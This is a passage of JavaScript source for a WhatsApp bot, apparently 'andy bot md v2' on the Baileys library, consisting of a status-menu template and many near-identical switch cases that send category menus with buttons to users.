╭─❒ 「 𝙖𝙣𝙙𝙮 𝙗𝙤𝙩 𝙢𝙙 𝙫2 」 
├ 𝙘𝙧𝙚𝙖𝙩𝙤𝙧 :  𝙖𝙣𝙙𝙮𝙢𝙧𝙡𝙞𝙩 @50941411147
├ 𝙥𝙤𝙬𝙚𝙧𝙚𝙙  : @${ini_mark.split('@')[0]}
├ 𝙥𝙧𝙚𝙛𝙞𝙭 :   ${prefix}
├ 𝙩𝙤𝙩𝙖𝙡 𝙝𝙞𝙩 : ${hitall}
├ 𝙨𝙥𝙚𝙚𝙙 : ${latensii.toFixed(4)} Second
├ 𝙢𝙚𝙢𝙤𝙧𝙮 𝙪𝙨𝙚𝙙 : ${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / ${Math.round(require('os').totalmem / 1024 / 1024)}MB
 |-𝙨𝙘𝙧𝙞𝙥𝙩 : 𝙝𝙩𝙩𝙥𝙨:𝙜𝙞𝙩𝙝𝙪𝙗.𝙘𝙤𝙢/𝙖𝙣𝙙𝙮𝙢𝙧𝙡𝙞𝙩
├ 𝙝𝙤𝙨𝙩𝙣𝙖𝙢𝙚 : ${os.hostname()}
├ 𝙥𝙡𝙖𝙩𝙛𝙤𝙧𝙢 : ${os.platform()}
├ 𝙥𝙧𝙞𝙫𝙖𝙩𝙚 𝙘𝙝𝙖𝙩 : ${(Object.keys(db.data.chats).filter(v => v.endsWith('@s.whatsapp.net')).map(v => v).length)}
├ 𝙜𝙧𝙤𝙪𝙥 𝙘𝙝𝙖𝙩 : ${(Object.keys(db.data.chats).filter(v => v.endsWith('@g.us')).map(v => v).length)}
├ 𝙩𝙤𝙩𝙖𝙡 𝙘𝙝𝙖𝙩 :  ${(Object.keys(db.data.chats).filter(v => v.endsWith('@s.whatsapp.net')).map(v => v).length) + (Object.keys(db.data.chats).filter(v => v.endsWith('@g.us')).map(v => v).length)} 
├ 𝙪𝙨𝙚𝙧 𝙞𝙣 𝙙𝙖𝙩𝙖𝙗𝙖𝙨𝙚 : ${Object.keys(global.db.data.users).length} Users
├ 𝙪𝙨𝙚𝙧 𝙧𝙚𝙜𝙞𝙨𝙩𝙚𝙧𝙚𝙙 : ${(Object.values(global.db.data.users).filter(user => user.registered == true).length)} Users
├ 𝙪𝙨𝙚𝙧𝙙 𝙗𝙖𝙣𝙣𝙚𝙙 : ${(Object.values(global.db.data.users).filter(user => user.banned == true).length)} Users
├ 𝙪𝙨𝙚𝙧 𝙗𝙡𝙤𝙘𝙠𝙞𝙧 : ${goblock == undefined ? '0' : goblock.length} Users
╰❒ 𝙧𝙪𝙣𝙩𝙞𝙢𝙚 : ${runtime(process.uptime())}

╭─❒ 「 𝙖𝙣𝙙𝙮𝙢𝙧𝙡𝙞𝙩 」 
├ 𝙢𝙖𝙨𝙚𝙝𝙞 : ${week}, ${date}
├ 𝙝𝙚𝙪𝙧𝙚 : ${dateIslamic}
╰❒

╭─❒ 「 𝙞𝙣𝙛𝙤 𝙪𝙨𝙚𝙧 」 
├ 𝙧𝙚𝙜𝙞𝙨𝙩𝙚𝙧: ${user.registered ? `✅\n├ 𝙣𝙖𝙢𝙚 : ${user.name}\n├ 𝙖𝙜𝙚 : ${user.age} years\n├ 𝙜𝙚𝙣𝙙𝙚𝙧𝙨 : ${user.gender}\n├ 𝙧𝙚𝙜𝙞𝙨𝙩𝙚𝙧𝙚𝙙 𝙤𝙣 : ${tanggal(user.regTime)}` : '❌'}
├ 𝙗𝙞𝙤 : ${bio ? bio : '-'}
├ 𝙣𝙤𝙢𝙤𝙧 : @${m.sender.split('@')[0]}
├ 𝙡𝙞𝙢𝙞𝙩 : ${limit} limit
├ 𝙭𝙥 : ${exp}
├ 𝙥𝙧𝙚𝙢𝙞𝙪𝙢 : ${user.premium ? '✅' : '❌'}
├ 𝙢𝙚 : ${m.key.fromMe ? 'True' : 'False'}
╰❒ 𝙤𝙬𝙣𝙚𝙧 : ${isCreator ? 'True' : `False`}
`	
const buttojns = [
  {buttonId: '.command', buttonText: {displayText: '𝙡𝙞𝙨𝙩 𝙢𝙚𝙣𝙪 🙂'}, type: 1},
  {buttonId: '.owner', buttonText: {displayText: '𝙖𝙣𝙙𝙮𝙢𝙧𝙡𝙞𝙩 ❤️'}, type: 1},
  {buttonId: '.register', buttonText: {displayText: '𝙧𝙚𝙜𝙞𝙨𝙩𝙚𝙧 ⭐'}, type: 1} 
]			
					if(typemenu == 'document'){
						if(db.data.users[m.sender].registered){
							alpha.sendButDoC(m.chat, ini_anu,  '© ' + ownername, botname , ownername, `WhatsApp Bot Multi Device`, time, pp_bot, pp_bot, buttojns, [ownernya, ini_mark, m.sender], { quoted: ftroli})
						} else alpha.sendButDoc(m.chat, ini_anu,  '© ' + ownername, botname , ownername, `WhatsApp Bot Multi Device`, time, pp_bot, pp_bot, buttojns, [ownernya, ini_mark, m.sender], { quoted: ftroli})
					}
					if(typemenu == 'templateLocation'){
						await alpha.sendButLoc(m.chat,  lang.menunya(salam, pushname, botname) , '©' + ownername, pp_bot, [
{buttonId: `.owner` , buttonText: {displayText: '𝙖𝙣𝙙𝙮𝙢𝙧𝙡𝙞𝙩 😎'}, type: 1},
{buttonId: `.register` , buttonText: {displayText: '𝙧𝙚𝙜𝙞𝙨𝙩𝙚𝙧 🤞'}, type: 1}
], {userJid: m.chat, quoted: m})
						}
						if(typemenu == 'templateTenor'){
							alpha.send5ButGif(m.chat, lang.menunya(salam, pushname, botname) , `© ${ownername}` ,pp_bot, thumbGif, [{"urlButton": {"displayText": "YouTube Creator","url": `${youtube}`}},{"urlButton": {"displayText": "Rest Api's","url": `${myweb}`}},{"quickReplyButton": {"displayText": "Donasi","id": '.donate'}},{"quickReplyButton": {"displayText": "Owner","id": '.owner'}},{"quickReplyButton": {"displayText": "List Command","id": '.command'}}] , {quoted: m})
						 }
						if(typemenu == 'katalog'){
							alpha.sendKatalog(m.chat, "ALL MENU BOT", lang.listMenu(time, salam, pushname, prefix), pp_bot, {quoted:m})
							}
						if(typemenu == 'katalog2'){
							alpha.sendKatalog2(m.chat, "ALL MENU BOT", lang.listMenu(time, salam, pushname, prefix), pp_bot, {quoted:m})
							}
						if(typemenu == 'list'){
							alpha.sendListMenu(m.chat, `╭─⬣「 _𝙞𝙣𝙛𝙤 𝙪𝙨𝙚𝙧_ 」⬣\n│  𝙣𝙖𝙢𝙚 : ${pushname}\n│  𝙣𝙪𝙢𝙗𝙚𝙧 : ${sender.split("@")[0]}\n│  *𝙨𝙩𝙖𝙩𝙪𝙨 : ${isCreator? ` Owner️ ${botname}` :`User ${botname}`}\n╰─⬣\n\n╭─⬣「 _𝙞𝙣𝙛𝙤 𝙗𝙤𝙩_ 」⬣\n│ 𝙥𝙧𝙚𝙛𝙞𝙭 :  ${prefix} \n│ 𝙣𝙖𝙢𝙚 : ${botname}\n│ 𝙤𝙬𝙣𝙚𝙧 : ${ownername}\n│ 𝙢𝙤𝙙𝙚 : ${alpha.public ? '𝙥𝙪𝙗𝙡𝙞𝙘 𝙢𝙤𝙙𝙚' : '𝙨𝙚𝙡𝙛 𝙢𝙤𝙙𝙚'}\n│ 𝙧𝙪𝙣𝙩𝙞𝙢𝙚* : ${runtime(process.uptime())}\n│ 𝙡𝙞𝙗 : 𝙗𝙖𝙞𝙡𝙚𝙮𝙨 𝙢𝙙@4.0.0\n |𝙨𝙘𝙧𝙞𝙥𝙩 : 𝙗𝙮 𝙖𝙣𝙙𝙮 \n╰─⬣\n\n╭─⬣「 _𝙝𝙖𝙞𝙩𝙞 𝙩𝙞𝙢𝙚_ 」⬣\n│ *𝙬𝙞𝙗* : ${time}\n│ 𝙬𝙞𝙩𝙖 : ${wita}\n│ 𝙬𝙞𝙩 : ${wit}  \n╰─⬣`, `© ${ownername}`, `𝙨𝙖𝙠 𝙜𝙚𝙣𝙡𝙖 ${salam} ${pushname} ☺️`, `𝙘𝙡𝙞𝙘𝙠 𝙝𝙚𝙧𝙚`, {quoted:fgif})
						}
					}
					break    
	case 'allmenu':{
		await alpha.sendButLoc(m.chat,  `Hai kak ${pushname} 👋, saya *${botname}* ` + '\n\n' + lang.listMenu(time, salam, pushname, prefix)  , '©' + ownername, pp_bot, [
{buttonId: `.owner` , buttonText: {displayText: '𝙖𝙣𝙙𝙮𝙢𝙧𝙡𝙞𝙩 😋'}, type: 1},
{buttonId: `.register` , buttonText: {displayText: '𝙧𝙚𝙜𝙞𝙨𝙩𝙚𝙧 🇫🇷'}, type: 1}
], {userJid: m.chat, quoted: m})
			}
	break   
	case 'infocmd': case'infomenu':{
		alpha.sendButImage(m.chat, sender, [{buttonId: '.command',buttonText:{displayText: '༺ Back'},type: 1},{buttonId:'.owner',buttonText: {displayText:'Owner ༻'}, type: 1}], `Selamat ${salam} @${sender.split('@')[0]} 😊\n\n╭─⬣「 _*INFO BOT*_ 」⬣\n│ *Prefix* :  ${prefix} \n│ *Name* : ${botname}\n│ *Owner* : @${ownernomer.split("@")[0]}\n│ *Mode* : ${alpha.public ? 'Public-Mode' : 'Self-Mode'}\n│ *Runtime* : ${runtime(process.uptime())}\n│ *Lib* : Baileys-Md@4.0.0\n╰─⬣` + '\n\n' +  lang.info(prefix), `© ${ownername}`, [sender, ownernomer + '@s.whatsapp.net'], {quoted:m})
      }
  break 
  case 'storecmd': case'storemenu':{
		alpha.sendButImage(m.chat, sender, [{buttonId: '.command',buttonText:{displayText: '༺ Back'},type: 1},{buttonId:'.owner',buttonText: {displayText:'Owner ༻'}, type: 1}], `Selamat ${salam} @${sender.split('@')[0]} 😊\n\n╭─⬣「 _*INFO BOT*_ 」⬣\n│ *Prefix* :  ${prefix} \n│ *Name* : ${botname}\n│ *Owner* : @${ownernomer.split("@")[0]}\n│ *Mode* : ${alpha.public ? 'Public-Mode' : 'Self-Mode'}\n│ *Runtime* : ${runtime(process.uptime())}\n│ *Lib* : Baileys-Md@4.0.0\n╰─⬣` + '\n\n' +  lang.storemenu(prefix), `© ${ownername}`, [sender, ownernomer + '@s.whatsapp.net'], {quoted:m})
      }
  break 
  case 'rpgcmd': case'rpgmenu':{
		alpha.sendButImage(m.chat, sender, [{buttonId: '.command',buttonText:{displayText: '༺ Back'},type: 1},{buttonId:'.owner',buttonText: {displayText:'Owner ༻'}, type: 1}], `Selamat ${salam} @${sender.split('@')[0]} 😊\n\n╭─⬣「 _*INFO BOT*_ 」⬣\n│ *Prefix* :  ${prefix} \n│ *Name* : ${botname}\n│ *Owner* : @${ownernomer.split("@")[0]}\n│ *Mode* : ${alpha.public ? 'Public-Mode' : 'Self-Mode'}\n│ *Runtime* : ${runtime(process.uptime())}\n│ *Lib* : Baileys-Md@4.0.0\n╰─⬣` + '\n\n' +  lang.rpgmenu(prefix), `© ${ownername}`, [sender, ownernomer + '@s.whatsapp.net'], {quoted:m})
      }
  break

case 'photooxycmd': case 'photooxymenu':{
		alpha.sendButImage(m.chat, sender, [{buttonId: '.command',buttonText:{displayText: '༺ Back'},type: 1},{buttonId:'.owner',buttonText: {displayText:'Owner ༻'}, type: 1}], `Selamat ${salam} @${sender.split('@')[0]} 😊\n\n╭─⬣「 _*INFO BOT*_ 」⬣\n│ *Prefix* :  ${prefix} \n│ *Name* : ${botname}\n│ *Owner* : @${ownernomer.split("@")[0]}\n│ *Mode* : ${alpha.public ? 'Public-Mode' : 'Self-Mode'}\n│ *Runtime* : ${runtime(process.uptime())}\n│ *Lib* : Baileys-Md@4.0.0\n╰─⬣` + '\n\n' +  lang.photooxy(prefix), `© ${ownername}`, [sender, ownernomer + '@s.whatsapp.net'], {quoted:m})
      }
  break 
  case 'storagecmd': case'storagemenu':{
		alpha.sendButImage(m.chat, sender, [{buttonId: '.command',buttonText:{displayText: '༺ Back'},type: 1},{buttonId:'.owner',buttonText: {displayText:'Owner ༻'}, type: 1}], `Selamat ${salam} @${sender.split('@')[0]} 😊\n\n╭─⬣「 _*INFO BOT*_ 」⬣\n│ *Prefix* :  ${prefix} \n│ *Name* : ${botname}\n│ *Owner* : @${ownernomer.split("@")[0]}\n│ *Mode* : ${alpha.public ? 'Public-Mode' : 'Self-Mode'}\n│ *Runtime* : ${runtime(process.uptime())}\n│ *Lib* : Baileys-Md@4.0.0\n╰─⬣` + '\n\n' +  lang.storagemenu(prefix), `© ${ownername}`, [sender, ownernomer + '@s.whatsapp.net'], {quoted:m})
      }
  break 
case 'voicecmd': case 'voicemenu':{
		alpha.sendButImage(m.chat, sender, [{buttonId: '.command',buttonText:{displayText: '༺ Back'},type: 1},{buttonId:'.owner',buttonText: {displayText:'Owner ༻'}, type: 1}], `Selamat ${salam} @${sender.split('@')[0]} 😊\n\n╭─⬣「 _*INFO BOT*_ 」⬣\n│ *Prefix* :  ${prefix} \n│ *Name* : ${botname}\n│ *Owner* : @${ownernomer.split("@")[0]}\n│ *Mode* : ${alpha.public ? 'Public-Mode' : 'Self-Mode'}\n│ *Runtime* : ${runtime(process.uptime())}\n│ *Lib* : Baileys-Md@4.0.0\n╰─⬣` + '\n\n' +  lang.voiceChange(prefix), `© ${ownername}`, [sender, ownernomer + '@s.whatsapp.net'], {quoted:m})
      }
  break 
  case 'anoncmd': case'anonmenu':{
		alpha.sendButImage(m.chat, sender, [{buttonId: '.command',buttonText:{displayText: '༺ Back'},type: 1},{buttonId:'.owner',buttonText: {displayText:'Owner ༻'}, type: 1}], `Selamat ${salam} @${sender.split('@')[0]} 😊\n\n╭─⬣「 _*INFO BOT*_ 」⬣\n│ *Prefix* :  ${prefix} \n│ *Name* : ${botname}\n│ *Owner* : @${ownernomer.split("@")[0]}\n│ *Mode* : ${alpha.public ? 'Public-Mode' : 'Self-Mode'}\n│ *Runtime* : ${runtime(process.uptime())}\n│ *Lib* : Baileys-Md@4.0.0\n╰─⬣` + '\n\n' +  lang.anonchat(prefix), `© ${ownername}`, [sender, ownernomer + '@s.whatsapp.net'], {quoted:m})
      }
  break 
	case 'ownercmd': case'ownermenu':{
		alpha.sendButImage(m.chat, sender, [{buttonId: '.command',buttonText:{displayText: '༺ Back'},type: 1},{buttonId:'.owner',buttonText: {displayText:'Owner ༻'}, type: 1}], `Selamat ${salam} @${sender.split('@')[0]} 😊\n\n╭─⬣「 _*INFO BOT*_ 」⬣\n│ *Prefix* :  ${prefix} \n│ *Name* : ${botname}\n│ *Owner* : @${ownernomer.split("@")[0]}\n│ *Mode* : ${alpha.public ? 'Public-Mode' : 'Self-Mode'}\n│ *Runtime* : ${runtime(process.uptime())}\n│ *Lib* : Baileys-Md@4.0.0\n╰─⬣` + '\n\n' +  lang.ownermenu(prefix), `© ${ownername}`, [sender, ownernomer + '@s.whatsapp.net'], {quoted:m})
      }
  break 
  case 'databasecmd': case'databasemenu':{
		alpha.sendButImage(m.chat, sender, [{buttonId: '.command',buttonText:{displayText: '༺ Back'},type: 1},{buttonId:'.owner',buttonText: {displayText:'Owner ༻'}, type: 1}], `Selamat ${salam} @${sender.split('@')[0]} 😊\n\n╭─⬣「 _*INFO BOT*_ 」⬣\n│ *Prefix* :  ${prefix} \n│ *Name* : ${botname}\n│ *Owner* : @${ownernomer.split("@")[0]}\n│ *Mode* : ${alpha.public ? 'Public-Mode' : 'Self-Mode'}\n│ *Runtime* : ${runtime(process.uptime())}\n│ *Lib* : Baileys-Md@4.0.0\n╰─⬣` + '\n\n' +  lang.database(prefix), `© ${ownername}`, [sender, ownernomer + '@s.whatsapp.net'], {quoted:m})
      }
  break 
  case 'groupcmd': case 'groupmenu':{
 alpha.sendButImage(m.chat, sender, [{buttonId: '.command',buttonText:{displayText: '༺ Back'},type: 1},{buttonId:'.owner',buttonText: {displayText:'Owner ༻'}, type: 1}], `Selamat ${salam} @${sender.split('@')[0]} 😊\n\n╭─⬣「 _*INFO BOT*_ 」⬣\n│ *Prefix* :  ${prefix} \n│ *Name* : ${botname}\n│ *Owner* : @${ownernomer.split("@")[0]}\n│ *Mode* : ${alpha.public ? 'Public-Mode' : 'Self-Mode'}\n│ *Runtime* : ${runtime(process.uptime())}\n│ *Lib* : Baileys-Md@4.0.0\n╰─⬣` + '\n\n' +  lang.group(prefix), `© ${ownername}`, [sender, ownernomer + '@s.whatsapp.net'], {quoted:m})
}
        break       
    case 'animecmd': case 'animemenu':{
 alpha.sendButImage(m.chat, sender, [{buttonId: '.command',buttonText:{displayText: '༺ Back'},type: 1},{buttonId:'.owner',buttonText: {displayText:'Owner ༻'}, type: 1}], `Selamat ${salam} @${sender.split('@')[0]} 😊\n\n╭─⬣「 _*INFO BOT*_ 」⬣\n│ *Prefix* :  ${prefix} \n│ *Name* : ${botname}\n│ *Owner* : @${ownernomer.split("@")[0]}\n│ *Mode* : ${alpha.public ? 'Public-Mode' : 'Self-Mode'}\n│ *Runtime* : ${runtime(process.uptime())}\n│ *Lib* : Baileys-Md@4.0.0\n╰─⬣` + '\n\n' +  lang.anime(prefix), `© ${ownername}`, [sender, ownernomer + '@s.whatsapp.net'], {quoted:m})
}
         break 
            case 'tagcmd': case 'tagmenu':{
 alpha.sendButImage(m.chat, sender, [{buttonId: '.command',buttonText:{displayText: '༺ Back'},type: 1},{buttonId:'.owner',buttonText: {displayText:'Owner ༻'}, type: 1}], `Selamat ${salam} @${sender.split('@')[0]} 😊\n\n╭─⬣「 _*INFO BOT*_ 」⬣\n│ *Prefix* :  ${prefix} \n│ *Name* : ${botname}\n│ *Owner* : @${ownernomer.split("@")[0]}\n│ *Mode* : ${alpha.public ? 'Public-Mode' : 'Self-Mode'}\n│ *Runtime* : ${runtime(process.uptime())}\n│ *Lib* : Baileys-Md@4.0.0\n╰─⬣` + '\n\n' +  lang.tag(prefix), `© ${ownername}`, [sender, ownernomer + '@s.whatsapp.net'], {quoted:m})
}
         break 
        case 'stalkcmd': case 'stalkmenu':{
 alpha.sendButImage(m.chat, sender, [{buttonId: '.command',buttonText:{displayText: '༺ Back'},type: 1},{buttonId:'.owner',buttonText: {displayText:'Owner ༻'}, type: 1}], `Selamat ${salam} @${sender.split('@')[0]} 😊\n\n╭─⬣「 _*INFO BOT*_ 」⬣\n│ *Prefix* :  ${prefix} \n│ *Name* : ${botname}\n│ *Owner* : @${ownernomer.split("@")[0]}\n│ *Mode* : ${alpha.public ? 'Public-Mode' : 'Self-Mode'}\n│ *Runtime* : ${runtime(process.uptime())}\n│ *Lib* : Baileys-Md@4.0.0\n╰─⬣` + '\n\n' +  lang.stalk(prefix), `© ${ownername}`, [sender, ownernomer + '@s.whatsapp.net'], {quoted:m})
}
         break         
        case 'searchcmd': case 'searchmenu':{
 alpha.sendButImage(m.chat, sender, [{buttonId: '.command',buttonText:{displayText: '༺ Back'},type: 1},{buttonId:'.owner',buttonText: {displayText:'Owner ༻'}, type: 1}], `Selamat ${salam} @${sender.split('@')[0]} 😊\n\n╭─⬣「 _*INFO BOT*_ 」⬣\n│ *Prefix* :  ${prefix} \n│ *Name* : ${botname}\n│ *Owner* : @${ownernomer.split("@")[0]}\n│ *Mode* : ${alpha.public ? 'Public-Mode' : 'Self-Mode'}\n│ *Runtime* : ${runtime(process.uptime())}\n│ *Lib* : Baileys-Md@4.0.0\n╰─⬣` + '\n\n' +  lang.search(prefix), `© ${ownername}`, [sender, ownernomer + '@s.whatsapp.net'], {quoted:m})
       }
  break 
        case 'convertercmd': case 'convertmenu':{
 alpha.sendButImage(m.chat, sender, [{buttonId: '.command',buttonText:{displayText: '༺ Back'},type: 1},{buttonId:'.owner',buttonText: {displayText:'Owner ༻'}, type: 1}], `Selamat ${salam} @${sender.split('@')[0]} 😊\n\n╭─⬣「 _*INFO BOT*_ 」⬣\n│ *Prefix* :  ${prefix} \n│ *Name* : ${botname}\n│ *Owner* : @${ownernomer.split("@")[0]}\n│ *Mode* : ${alpha.public ? 'Public-Mode' : 'Self-Mode'}\n│ *Runtime* : ${runtime(process.uptime())}\n│ *Lib* : Baileys-Md@4.0.0\n╰─⬣` + '\n\n' +  lang.converter(prefix), `© ${ownername}`, [sender, ownernomer + '@s.whatsapp.net'], {quoted:m})
}
         break 
        case 'stickercmd': case 'stickermenu':{
 alpha.sendButImage(m.chat, sender, [{buttonId: '.command',buttonText:{displayText: '༺ Back'},type: 1},{buttonId:'.owner',buttonText: {displayText:'Owner ༻'}, type: 1}], `Selamat ${salam} @${sender.split('@')[0]} 😊\n\n╭─⬣「 _*INFO BOT*_ 」⬣\n│ *Prefix* :  ${prefix} \n│ *Name* : ${botname}\n│ *Owner* : @${ownernomer.split("@")[0]}\n│ *Mode* : ${alpha.public ? 'Public-Mode' : 'Self-Mode'}\n│ *Runtime* : ${runtime(process.uptime())}\n│ *Lib* : Baileys-Md@4.0.0\n╰─⬣` + '\n\n' +  lang.effect(prefix), `© ${ownername}`, [sender, ownernomer + '@s.whatsapp.net'], {quoted:m})
}
         break 
        case 'stickercmd2': case 'stickermenu2':{
 alpha.sendButImage(m.chat, sender, [{buttonId: '.command',buttonText:{displayText: '༺ Back'},type: 1},{buttonId:'.owner',buttonText: {displayText:'Owner ༻'}, type: 1}], `Selamat ${salam} @${sender.split('@')[0]} 😊\n\n╭─⬣「 _*INFO BOT*_ 」⬣\n│ *Prefix* :  ${prefix} \n│ *Name* : ${botname}\n│ *Owner* : @${ownernomer.split("@")[0]}\n│ *Mode* : ${alpha.public ? 'Public-Mode' : 'Self-Mode'}\n│ *Runtime* : ${runtime(process.uptime())}\n│ *Lib* : Baileys-Md@4.0.0\n╰─⬣` + '\n\n' +  lang.effect2(prefix), `© ${ownername}`, [sender, ownernomer + '@s.whatsapp.net'], {quoted:m})
}
         break 
        case 'downloadercmd': case 'downloadmenu':{
 alpha.sendButImage(m.chat, sender, [{buttonId: '.command',buttonText:{displayText: '༺ Back'},type: 1},{buttonId:'.owner',buttonText: {displayText:'Owner ༻'}, type: 1}], `Selamat ${salam} @${sender.split('@')[0]} 😊\n\n╭─⬣「 _*INFO BOT*_ 」⬣\n│ *Prefix* :  ${prefix} \n│ *Name* : ${botname}\n│ *Owner* : @${ownernomer.split("@")[0]}\n│ *Mode* : ${alpha.public ? 'Public-Mode' : 'Self-Mode'}\n│ *Runtime* : ${runtime(process.uptime())}\n│ *Lib* : Baileys-Md@4.0.0\n╰─⬣` + '\n\n' +  lang.download(prefix), `© ${ownername}`, [sender, ownernomer + '@s.whatsapp.net'], {quoted:m})
}
         break 
        case 'ranimecmd': case 'animemenu':{
 alpha.sendButImage(m.chat, sender, [{buttonId: '.command',buttonText:{displayText: '༺ Back'},type: 1},{buttonId:'.owner',buttonText: {displayText:'Owner ༻'}, type: 1}], `Selamat ${salam} @${sender.split('@')[0]} 😊\n\n╭─⬣「 _*INFO BOT*_ 」⬣\n│ *Prefix* :  ${prefix} \n│ *Name* : ${botname}\n│ *Owner* : @${ownernomer.split("@")[0]}\n│ *Mode* : ${alpha.public ? 'Public-Mode' : 'Self-Mode'}\n│ *Runtime* : ${runtime(process.uptime())}\n│ *Lib* : Baileys-Md@4.0.0\n╰─⬣` + '\n\n' +  lang.ranime(prefix), `© ${ownername}`, [sender, ownernomer + '@s.whatsapp.net'], {quoted:m})
}
        break 
        case 'nsfwcmd': case 'nsfwcommand':{
 alpha.sendButImage(m.chat, sender, [{buttonId: '.command',buttonText:{displayText: '༺ Back'},type: 1},{buttonId:'.owner',buttonText: {displayText:'Owner ༻'}, type: 1}], `Selamat ${salam} @${sender.split('@')[0]} 😊\n\n╭─⬣「 _*INFO BOT*_ 」⬣\n│ *Prefix* :  ${prefix} \n│ *Name* : ${botname}\n│ *Owner* : @${ownernomer.split("@")[0]}\n│ *Mode* : ${alpha.public ? 'Public-Mode' : 'Self-Mode'}\n│ *Runtime* : ${runtime(process.uptime())}\n│ *Lib* : Baileys-Md@4.0.0\n╰─⬣` + '\n\n' +  lang.nsfw(prefix), `© ${ownername}`, [sender, ownernomer + '@s.whatsapp.net'], {quoted:m})
        }
break 
case 'textprocmd': case 'textpromenu':{
 alpha.sendButImage(m.chat, sender, [{buttonId: '.command',buttonText:{displayText: '༺ Back'},type: 1},{buttonId:'.owner',buttonText: {displayText:'Owner ༻'}, type: 1}], `Selamat ${salam} @${sender.split('@')[0]} 😊\n\n╭─⬣「 _*INFO BOT*_ 」⬣\n│ *Prefix* :  ${prefix} \n│ *Name* : ${botname}\n│ *Owner* : @${ownernomer.split("@")[0]}\n│ *Mode* : ${alpha.public ? 'Public-Mode' : 'Self-Mode'}\n│ *Runtime* : ${runtime(process.uptime())}\n│ *Lib* : Baileys-Md@4.0.0\n╰─⬣` + '\n\n' +  lang.textpro(prefix), `© ${ownername}`, [sender, ownernomer + '@s.whatsapp.net'], {quoted:m})
}
        break 
        case 'othercmd': case 'othermenu':{
 alpha.sendButImage(m.chat, sender, [{buttonId: '.command',buttonText:{displayText: '༺ Back'},type: 1},{buttonId:'.owner',buttonText: {displayText:'Owner ༻'}, type: 1}], `Selamat ${salam} @${sender.split('@')[0]} 😊\n\n╭─⬣「 _*INFO BOT*_ 」⬣\n│ *Prefix* :  ${prefix} \n│ *Name* : ${botname}\n│ *Owner* : @${ownernomer.split("@")[0]}\n│ *Mode* : ${alpha.public ? 'Public-Mode' : 'Self-Mode'}\n│ *Runtime* : ${runtime(process.uptime())}\n│ *Lib* : Baileys-Md@4.0.0\n╰─⬣` + '\n\n' +  lang.other(prefix), `© ${ownername}`, [sender, ownernomer + '@s.whatsapp.net'], {quoted:m})
}
        break 
        case 'gamecmd': case 'gamemenu':{
 alpha.sendButImage(m.chat, sender, [{buttonId: '.command',buttonText:{displayText: '༺ Back'},type: 1},{buttonId:'.owner',buttonText: {displayText:'Owner ༻'}, type: 1}], `Selamat ${salam} @${sender.split('@')[0]} 😊\n\n╭─⬣「 _*INFO BOT*_ 」⬣\n│ *Prefix* :  ${prefix} \n│ *Name* : ${botname}\n│ *Owner* : @${ownernomer.split("@")[0]}\n│ *Mode* : ${alpha.public ? 'Public-Mode' : 'Self-Mode'}\n│ *Runtime* : ${runtime(process.uptime())}\n│ *Lib* : Baileys-Md@4.0.0\n╰─⬣` + '\n\n' +  lang.game(prefix), `© ${ownername}`, [sender, ownernomer + '@s.whatsapp.net'], {quoted:m})
}
         break 
         case 'soundcmd': case 'soundmenu':{
 alpha.sendButImage(m.chat, sender, [{buttonId: '.command',buttonText:{displayText: '༺ Back'},type: 1},{buttonId:'.owner',buttonText: {displayText:'Owner ༻'}, type: 1}], `Selamat ${salam} @${sender.split('@')[0]} 😊\n\n╭─⬣「 _*INFO BOT*_ 」⬣\n│ *Prefix* :  ${prefix} \n│ *Name* : ${botname}\n│ *Owner* : @${ownernomer.split("@")[0]}\n│ *Mode* : ${alpha.public ? 'Public-Mode' : 'Self-Mode'}\n│ *Runtime* : ${runtime(process.uptime())}\n│ *Lib* : Baileys-Md@4.0.0\n╰─⬣` + '\n\n' +  lang.soundmenu(prefix), `© ${ownername}`, [sender, ownernomer + '@s.whatsapp.net'], {quoted:m})
}
         break 
         case 'logocmd': case 'logomenu':{
 alpha.sendButImage(m.chat, sender, [{buttonId: '.command',buttonText:{displayText: '༺ Back'},type: 1},{buttonId:'.owner',buttonText: {displayText:'Owner ༻'}, type: 1}], `Selamat ${salam} @${sender.split('@')[0]} 😊\n\n╭─⬣「 _*INFO BOT*_ 」⬣\n│ *Prefix* :  ${prefix} \n│ *Name* : ${botname}\n│ *Owner* : @${ownernomer.split("@")[0]}\n│ *Mode* : ${alpha.public ? 'Public-Mode' : 'Self-Mode'}\n│ *Runtime* : ${runtime(process.uptime())}\n│ *Lib* : Baileys-Md@4.0.0\n╰─⬣` + '\n\n' +  lang.logomenu(prefix), `© ${ownername}`, [sender, ownernomer + '@s.whatsapp.net'], {quoted:m})
}
         break 
         case 'islamcmd': case 'islammenu':{
 alpha.sendButImage(m.chat, sender, [{buttonId: '.command',buttonText:{displayText: '༺ Back'},type: 1},{buttonId:'.owner',buttonText: {displayText:'Owner ༻'}, type: 1}], `Selamat ${salam} @${sender.split('@')[0]} 😊\n\n╭─⬣「 _*INFO BOT*_ 」⬣\n│ *Prefix* :  ${prefix} \n│ *Name* : ${botname}\n│ *Owner* : @${ownernomer.split("@")[0]}\n│ *Mode* : ${alpha.public ? 'Public-Mode' : 'Self-Mode'}\n│ *Runtime* : ${runtime(process.uptime())}\n│ *Lib* : Baileys-Md@4.0.0\n╰─⬣` + '\n\n' +  lang.islammenu(prefix), `© ${ownername}`, [sender, ownernomer + '@s.whatsapp.net'], {quoted:m})
}
         break 
        case 'asupancmd': case 'asupanmenu':{
 alpha.sendButImage(m.chat, sender, [{buttonId: '.command',buttonText:{displayText: '༺ Back'},type: 1},{buttonId:'.owner',buttonText: {displayText:'Owner ༻'}, type: 1}], `Selamat ${salam} @${sender.split('@')[0]} 😊\n\n╭─⬣「 _*INFO BOT*_ 」⬣\n│ *Prefix* :  ${prefix} \n│ *Name* : ${botname}\n│ *Owner* : @${ownernomer.split("@")[0]}\n│ *Mode* : ${alpha.public ? 'Public-Mode' : 'Self-Mode'}\n│ *Runtime* : ${runtime(process.uptime())}\n│ *Lib* : Baileys-Md@4.0.0\n╰─⬣` + '\n\n' +  lang.asupan(prefix), `© ${ownername}`, [sender, ownernomer + '@s.whatsapp.net'], {quoted:m})
}
        break 
        case 'cecancmd': case 'cecanmenu':{
